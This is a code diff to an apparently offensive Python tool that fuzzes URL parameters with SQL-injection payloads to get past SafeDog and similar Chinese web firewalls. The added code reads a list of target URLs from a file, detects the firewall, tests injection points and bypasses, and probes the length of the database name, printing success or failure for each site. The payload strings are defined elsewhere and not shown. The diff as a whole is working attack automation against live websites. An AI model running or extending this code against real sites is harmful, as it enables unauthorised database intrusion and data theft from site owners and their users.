@@ -30,6 +30,8 @@ import re
 import requests
 import dis
 import argparse
+import time
+import traceback
 import logging
 from logging.handlers import RotatingFileHandler
 from colorlog import ColoredFormatter
@@ -135,72 +137,72 @@ class Find_attribute(object):
                             
 
     
-    def Find_reqajax_parameter(self):
-        """获取基于ajax的post参数值."""
-        self.kt_j = []
-        self.zj_j = []
-        self.zj_z = []
-        self.jw_z = []
-        headers = get_headers()
-        r = requests.get(self.url,headers=headers)
-        encodes = self.Find_encodes()
-        r = r.content.decode(encodes)
-        html=etree.HTML(r,etree.HTMLParser())
-        result=html.xpath('//script/text()')
-        for v in result:
-            # print(v)
-            pattern = re.compile(r'data:.*')
-            result1 = pattern.findall(v)
-            # print('-> ',result1)
-            try:
-                result1 = result1.split(',')
-            except:
-                for result1 in result1:
-                    if result1:
-                        # print('1 -> ',result1)
-                        # print('1 -> ',type(result1))
-                        for result1 in result1.split(':'):
-                            if result1:
-                                result1 = result1.split(',')
-                                for result1 in result1:
-                                    if result1:
-                                        # print(result1)
-                                        #Key matching the beginning.
-                                        if '{' in result1:
-                                            if result1:
-                                                result2 = result1.strip()
-                                                #Find {
-                                                f = result2.find('{')
-                                                f1 = result2[f:].strip()
-                                                if '{}' not in f1:
-                                                    f1 = f1.strip('{').strip('"').strip()
-                                                    self.kt_j.append(f1)
+    # def Find_reqajax_parameter(self):
+    #     """获取基于ajax的post参数值."""
+    #     self.kt_j = []
+    #     self.zj_j = []
+    #     self.zj_z = []
+    #     self.jw_z = []
+    #     headers = get_headers()
+    #     r = requests.get(self.url,headers=headers)
+    #     encodes = self.Find_encodes()
+    #     r = r.content.decode(encodes)
+    #     html=etree.HTML(r,etree.HTMLParser())
+    #     result=html.xpath('//script/text()')
+    #     for v in result:
+    #         # print(v)
+    #         pattern = re.compile(r'data:.*')
+    #         result1 = pattern.findall(v)
+    #         # print('-> ',result1)
+    #         try:
+    #             result1 = result1.split(',')
+    #         except:
+    #             for result1 in result1:
+    #                 if result1:
+    #                     # print('1 -> ',result1)
+    #                     # print('1 -> ',type(result1))
+    #                     for result1 in result1.split(':'):
+    #                         if result1:
+    #                             result1 = result1.split(',')
+    #                             for result1 in result1:
+    #                                 if result1:
+    #                                     # print(result1)
+    #                                     #Key matching the beginning.
+    #                                     if '{' in result1:
+    #                                         if result1:
+    #                                             result2 = result1.strip()
+    #                                             #Find {
+    #                                             f = result2.find('{')
+    #                                             f1 = result2[f:].strip()
+    #                                             if '{}' not in f1:
+    #                                                 f1 = f1.strip('{').strip('"').strip()
+    #                                                 self.kt_j.append(f1)
                                                     
                                     
-                                    #Matching Intermediate key or value.
-                                    if '{' not in result1 and '"' in result1:
-                                        if result1:
-                                            if '"' in result1:
-                                                result2 = result1.strip().strip('"')
-                                                self.zj_j.append(result2)
+    #                                 #Matching Intermediate key or value.
+    #                                 if '{' not in result1 and '"' in result1:
+    #                                     if result1:
+    #                                         if '"' in result1:
+    #                                             result2 = result1.strip().strip('"')
+    #                                             self.zj_j.append(result2)
 
-                                    if '{' not in result1 and '"' not in result1:
-                                        if result1:
-                                            if '}' not in result1:
-                                                result2 = result1.strip()
-                                                self.zj_z.append(result2)
+    #                                 if '{' not in result1 and '"' not in result1:
+    #                                     if result1:
+    #                                         if '}' not in result1:
+    #                                             result2 = result1.strip()
+    #                                             self.zj_z.append(result2)
 
-                                    #Match the endpoint value
-                                    if '}' in result1 and '"' not in result1:
-                                        if result1:
-                                            if '{}' not in result1:
-                                                f1 = result1.strip('}').strip()
-                                                self.jw_z.append(f1)
+    #                                 #Match the endpoint value
+    #                                 if '}' in result1 and '"' not in result1:
+    #                                     if result1:
+    #                                         if '{}' not in result1:
+    #                                             f1 = result1.strip('}').strip()
+    #                                             self.jw_z.append(f1)
                                             
-        # print(self.kt_j[0])
-        # # print(zj_z)
-        # print(self.zj_j)
-        # # print(jw_z)
+    #     # print(self.kt_j[0])
+    #     # # print(zj_z)
+    #     # print(self.zj_j)
+    #     # # print(jw_z)
     
 
 
@@ -278,7 +280,7 @@ class RePLace(Payload1,
         self.name = ''
         
 
-    def new_url1(self,url,pd=''):
+    def nurl1(self,url,pd=''):
         if '?' in url:
             if 'True' in pd:
                 urls = url.split('?')
@@ -294,7 +296,7 @@ class RePLace(Payload1,
             pass
 
 
-    def new_url2(self,url,pd=''):
+    def nurl2(self,url,pd=''):
         if '?' in url:
             url1 = []
             par1 = []
@@ -318,13 +320,26 @@ class RePLace(Payload1,
             
         # pattern = re.compile(r'')
         # result1 = pattern.findall(v)
+    
+    def nurl_(self,url):
+        u1 = self.nurl1(url,'True')
+        url1 = u1[0]
+        pars1 = u1[1]
+        return (url1,pars1)
+
+    def nurl__(self,url):
+        u1 = self.nurl2(url,'True')
+        url1 = u1[0]
+        pars1 = u1[1]
+        return (url1,pars1)
+
 
     def collect_waf_page(self):
         """
         查找存在安全狗的站点(GET)
         """
         try:
-            u1 = self.new_url1(self.url,'True')
+            u1 = self.nurl_(self.url)
             url1 = u1[0]
             pars1 = u1[1]
             payloads = self.t
@@ -337,9 +352,10 @@ class RePLace(Payload1,
                     return (r,urls)
                     
             return False
-        except:
+        except Exception as e:
+            print('Error1 -> ',traceback.format_exc())
             try:
-                u1 = self.new_url2(self.url,'True')
+                u1 = self.nurl__(self.url)
                 url1 = u1[0]
                 pars1 = u1[1]
                 payloads = self.t
@@ -353,48 +369,99 @@ class RePLace(Payload1,
                             return (r,urls)
                 
                 return False    
-            except:
+            except Exception as e:
+                print('Error2 -> ',traceback.format_exc())
                 return False
                     
 
 
+
+    def Injection_point_test(self,url):
+        """
+        1.注入点测试(GET)
+        """
+        try:
+            u1 = self.nurl_(url)
+            url1 = u1[0]
+            pars1 = u1[1]
+            payloads = self.payloads1
+            for payloads in payloads:
+                urls = url1 + pars1 + payloads
+                if urls:
+                    print('[*]payloads3 -> '+urls)
+                r = self.req_(urls)
+                if '安全狗' not in r and '网站防火墙' not in r:
+                    return (r,urls)
                     
-
-                        
-
-
-    # def payload1(self):
-    #     """
-    #     1.注入点测试(GET)
-    #     """
-    #     p = self.payloads1
-    #     pars = self.new_url()
-    #     for p in p:
-    #         for pars in pars:
-    #             url = self.url+pars+p
-    #             r = self.req_(url)
-    #             if "网站防火墙" not in r and "安全狗" not in r:
-    #                 self.INFO('发现注入点.')
-    #                 return url
-    #             else:
-    #                 self.ERROR('不存在注入点.')
-    #                 return False
-        
+            return False
+        except:
+            try:
+                u1 = self.nurl__(url)
+                url1 = u1[0]
+                pars1 = u1[1]
+                payloads = self.payloads1
+                for payloads in payloads:
+                    for pars in pars1:
+                        urls = url1 + pars + payloads
+                        if urls:
+                            print('[*]payloads4 -> '+urls)
+                        r = self.req_(urls)
+                        if '安全狗' not in r and '网站防火墙' not in r:
+                            return (r,urls)
+                
+                return False    
+            except:
+                return False
     
-    # def payload2(self):
-    #     """
-    #     2.判断数据库长度(GET)
-    #     """
-    #     l = 0
-    #     while True:
-    #         p = self.payloads3.format(str(l))
-    #         url = self.url+p
-    #         r = self.req_(url)
-    #         if "网站防火墙" not in r and "安全狗" not in r:
-    #             return r
-    #         else:
-    #             return False
-    #         l += 1
+    
+    def Judging_database_length1(self,url):
+        """
+        2.判断数据库长度(GET)
+        """
+        try:
+            result = []
+            u1 = self.nurl_(url)
+            url1 = u1[0]
+            pars1 = u1[1]
+            payloads = self.payloads3
+            i = 0
+            while True:
+                urls = url1 + pars1 + payloads.format(i)
+                if urls:
+                    print('[*]payloads5 -> '+urls)
+                r = self.req_(urls)
+                if '安全狗' not in r and '网站防火墙' not in r:
+                    result.append(r)
+                    for res in result:
+                        if r not in res:
+                            return r
+                
+                i += 1
+            return False
+        except:
+            try:
+                result = []
+                u1 = self.nurl__(url)
+                url1 = u1[0]
+                pars1 = u1[1]
+                payloads = self.payloads3
+                i = 0
+                while True:    
+                    for pars in pars1:
+                        urls = url1 + pars + payloads.format(i)
+                        if urls:
+                            print('[*]payloads6 -> '+urls)
+                        r = self.req_(urls)
+                        if '安全狗' not in r and '网站防火墙' not in r:
+                            result.append(r)
+                            for res in result:
+                                if r not in res:
+                                    return r
+                    i += 1
+                    
+                return False    
+            except:
+                return False
 
     # def payload2_(self):
     #     """
@@ -600,18 +667,18 @@ def get_headers():
     return random.choice(useragents)
 
 
-class test(Find_attribute):
+# class test(Find_attribute):
 
-    def __init__(self,url):
-        self.url = url
+#     def __init__(self,url):
+#         self.url = url
 
-    def test(self):
-        self.Find_reqajax_parameter()
-        # print(self.kt_j)
-        # print(self.zj_j)
-        # print(self.jw_z)
-        # self.Find_name()
-        # print(self.Find_encodes())
+#     def test(self):
+#         self.Find_reqajax_parameter()
+#         # print(self.kt_j)
+#         # print(self.zj_j)
+#         # print(self.jw_z)
+#         # self.Find_name()
+#         # print(self.Find_encodes())
         
         
         
@@ -645,17 +712,37 @@ if __name__ == "__main__":
     # # s = test('https://www.aynax.com/login.php')
     # s.test()
 
-
 def run():
     args = mian()
-    with open(args.multiple,'r') as f:
+    print(logo)
+    print('')
+    time.sleep(1)
+    # with open(args.multiple,'r') as f:
+    with open('URL.txt','r') as f:
         for url in f.readlines():
             s = RePLace(url,'Fuzz_WaF')
             a = s.collect_waf_page()
             if not a:
-                print('[-]失效地址 -> '+url)
+                print('[-]不存在注入点 | payloads -> '+url)
             else:
-                print('[+]成功地址 -> '+url)
+                print('[+]存在注入点 | payloads -> '+url)
+                a = s.Injection_point_test(url)
+                if not a:
+                    print('[-]过滤绕过失败 | payloads -> '+url)
+                else:
+                    print('[+]过滤绕过成功 | payloads -> '+url)
+                    a = s.Judging_database_length1(url)
+                    if not a:
+                        print('[-]获取数据库长度失败 | payloads -> '+url)
+                    else:
+                        print('[+]获取数据库长度成功 | payloads -> '+url)
+                        print('Result -> ',a)
+
+                    
+
+
+
+
                 
                 
 
